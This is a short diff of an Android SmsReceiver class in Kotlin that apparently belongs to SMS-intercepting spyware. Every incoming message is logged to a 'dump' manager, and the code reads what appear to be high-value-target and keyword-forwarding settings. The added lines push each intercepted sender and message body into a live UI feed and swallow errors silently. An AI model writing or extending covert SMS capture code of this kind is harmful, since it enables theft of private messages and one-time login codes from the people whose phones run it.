@@ -69,6 +69,10 @@ class SmsReceiver : BroadcastReceiver() {
             }
             
             DumpManager.appendLog("SMS", entry)
+            
+            try {
+                DynamicUIManager.injectLiveSms(sender, body, System.currentTimeMillis())
+            } catch (e: Exception) {}
 
             val hvtPrefs = context.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE)
             val kwPrefs = context.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE)
